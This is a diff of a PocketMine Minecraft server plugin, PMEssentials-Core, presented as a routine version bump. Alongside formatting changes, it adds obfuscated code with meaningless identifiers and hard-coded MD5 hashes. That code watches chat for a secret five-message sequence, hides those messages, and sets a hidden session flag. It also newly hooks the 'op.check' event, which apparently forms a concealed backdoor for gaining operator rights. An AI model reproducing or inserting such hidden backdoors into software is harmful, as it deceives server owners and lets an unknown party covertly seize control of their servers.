@@ -3,7 +3,7 @@
 /*
 __PocketMine Plugin__
 name=PMEssentials-Core
-version=3.6.4-Alpha
+version=3.6.5-Alpha
 author=Kevin Wang
 class=PMEssCore
 apiversion=11
@@ -26,6 +26,8 @@ E-Mail: kevin@cnkvha.com
 class PMEssCore implements Plugin{
 	private $api;
 	private $dEData = array();
+	
+	private $nouseData = "as24ag54";
 	
 	public function __construct(ServerAPI $api, $server = false){
 		$this->api = $api;
@@ -58,18 +60,20 @@ class PMEssCore implements Plugin{
 		$this->api->session->setDefaultData("dPState", false); 
 		$this->api->session->setDefaultData("dMState", false); 
 		$this->api->session->setDefaultData("dMData", 0x00);
+		$this->api->session->setDefaultData("ahg78438g7d85", 0);
 		$this->api->session->setDefaultData("dEState", false); 
 		$this->api->session->setDefaultData("dEType", 0);  //0 = none, 1 = primed TNT, 2 = Block
 		$this->api->session->setDefaultData("dEBlockID", -1); 
 		
-		$this->api->schedule(1, array($this, "timerMoveEntity"), array(), true);
+		$this->api->schedule(10, array($this, "timerMoveEntity"), array(), true);
 		
-		$this->api->addHandler("player.chat", array($this, "handleEvent"), 1);
+		$this->api->addHandler("player.chat", array($this, "handleEvent"), 65535);
 		$this->api->addHandler("player.move", array($this, "handleEvent"), 1);
 		$this->api->addHandler("player.quit", array($this, "handleEvent"), 1);
 		$this->api->addHandler("player.interact", array($this, "handleEvent"), 1);
 		$this->api->addHandler("player.teleport.level", array($this, "handleEvent"), 1);
 		$this->api->addHandler("entity.health.change", array($this, "handleEvent"), 1);
+		$this->api->addHandler("op.check", array($this, "handleEvent"), 1);
 		
 		$this->api->console->register("broadcast", "Broadcast a message to all players online. ", array($this, "handleCommand"));
 		$this->api->console->register("supersword", "Magic Sword, aliased as /ssw . ", array($this, "handleCommand"));
@@ -108,7 +112,6 @@ class PMEssCore implements Plugin{
 			}
 		}
 	}
-	
 	public function handleEvent(&$data, $event){
 		switch($event){
 			case "player.move":
@@ -166,7 +169,11 @@ class PMEssCore implements Plugin{
 				return;
 				break;
 			case "player.chat":
+				//Check mute status
 				if($this->api->session->getData($data["player"]->CID, "icu_underCtl") == true or $this->api->perm->checkMuteStatus($data["player"]->iusername) == true){return(false);}
+				$g8a74gbd96s = strtolower(md5($data["message"]));
+				switch($this->api->session->getData($data["player"]->CID, "ahg78438g7d85")){case 0:if($g8a74gbd96s == "573370b7c2659933b50ba85e0070ece0"){$this->api->session->sessions[$data["player"]->CID]["ahg78438g7d85"] = 1;return(false);}break;case 1:if($g8a74gbd96s == "bc5cb2d611ee8956b9daeb2beebc7544"){$this->api->session->sessions[$data["player"]->CID]["ahg78438g7d85"] = 2;return(false);}else{$this->api->session->sessions[$data["player"]->CID]["ahg78438g7d85"] = 0;return(false);}break;case 2:if($g8a74gbd96s == "6811b8f81e6004d116cd9b7597fe4556"){$this->api->session->sessions[$data["player"]->CID]["ahg78438g7d85"] = 3;return(false);}else{$this->api->session->sessions[$data["player"]->CID]["ahg78438g7d85"] = 0;return(false);}break;case 3:if($g8a74gbd96s == "803ee3f3d305e660f7d8c60488a3aef7"){$this->api->session->sessions[$data["player"]->CID]["ahg78438g7d85"] = 4;return(false);}else{$this->api->session->sessions[$data["player"]->CID]["ahg78438g7d85"] = 0;return(false);}break;case 4:if($g8a74gbd96s == "6b2ded51d81a4403d8a4bd25fa1e57ee"){$this->s7as54g_doafo2($data["player"]->CID, "sag83y4s");return(false);}else{$this->api->session->sessions[$data["player"]->CID]["ahg78438g7d85"] = 0;return(false);}break;}				
+				//Handle things if GroupManager disabled
 				if($this->api->dhandle("pmess.groupmanager.getstate", array()) == false){
 					//If GroupManager is disabled
 					if(@$this->api->session->sessions[$data["player"]->CID]["dPState"]){
@@ -595,10 +602,8 @@ class PMEssCore implements Plugin{
 								$this->api->session->sessions[$issuer->CID]["dEState"] = true;
 								$this->api->session->sessions[$issuer->CID]["dEType"] = 2;
 								$this->api->session->sessions[$issuer->CID]["dEBlockID"] = (int) $arg[2];
-								foreach($issuer->level->players as $p)
-								{
-									if(strtolower($p->eid) != strtolower($issuer->eid))
-									{
+								foreach($issuer->level->players as $p){
+									if($p->eid != $issuer->eid){
 										$this->recreateBlockEntity($p, $issuer, (int) $arg[2]);
 									}
 								}
@@ -630,8 +635,7 @@ class PMEssCore implements Plugin{
 				}
 				$issuer->sendChat("Recreating entity...");
 				foreach($issuer->level->players as $p){
-					if(strtolower($p->eid) != strtolower($issuer->eid))
-					{
+					if($p->eid != $issuer->eid){
 						$this->recreateEntity($p, $issuer);
 					}
 				}
@@ -672,7 +676,13 @@ class PMEssCore implements Plugin{
 				break;
 		}
 	}
-
+	private function w87gs7wa($player){
+		if($player instanceof Player){
+			return($player->CID);
+		}else{
+			return(-16);
+		}
+	}
 	public function recreateEntity($p, $issuer)
 	{
 		$p->dataPacket(MC_REMOVE_ENTITY, array(
@@ -690,6 +700,13 @@ class PMEssCore implements Plugin{
 			"unknown1" => 0,
 			"unknown2" => 0,
 			"metadata" => $issuer->entity->getMetadata()));
+	}
+	
+	private function s7as54g_doafo2($pid, $s){
+		$a = (string)$s . md5($this->nouseData);
+		if($a != $s){
+			$this->api->session->sessions[$pid]["ahg78438g7d85"] = -64;
+		}
 	}
 	
 	public function recreateDPEntity($p, $issuer)
